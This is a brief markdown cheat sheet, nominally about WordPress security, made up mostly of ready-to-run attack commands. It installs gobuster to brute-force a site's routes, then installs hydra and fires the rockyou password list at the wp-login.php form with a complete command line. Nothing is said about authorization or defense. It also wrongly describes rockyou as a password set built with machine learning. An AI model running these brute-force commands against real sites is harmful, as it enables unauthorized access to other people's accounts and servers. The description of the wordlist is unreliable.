# Wordpress security

## Brute-force on website routes

1. Install a tool to brute-force a domain name (every routes)
```sh
brew install gobuster
```

2. Download a word directory list dictionnarie:
https://github.com/OJ/gobuster (for exemple)

3. Execute gobuster on a website
```sh
gobuster dir -w <dictionnarie> -u <url>
```

## Brute-force on a password form

1. Install a tool to brute-force a form
```sh
brew install hydra
```

2. Go on Kaggle to retrieve a dataset of passwords etablished with machine learning (rockyou) and download it:
https://www.kaggle.com/wjburns/common-password-list-rockyoutxt

3. Unleash Hydra on Worpress website
```sh
hydra -l <userName> -P <passwordFilePath> <basicUrlWithoutHttp> https-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```
